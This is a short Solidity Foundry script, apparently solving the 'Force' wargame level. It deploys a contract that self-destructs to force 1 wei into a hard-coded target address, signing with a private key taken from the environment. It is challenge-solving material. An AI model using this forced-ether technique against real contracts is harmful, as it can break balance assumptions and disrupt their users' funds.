// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/07_Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    constructor(address victim) payable {
        selfdestruct(payable(victim));
    }
}

contract ForceAttack is Script {
    address target = 0x19C59cD8f6c85848B3EE95C778698328ab2F84b9;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack{value: 1}(target);
        vm.stopBroadcast();
    }
}
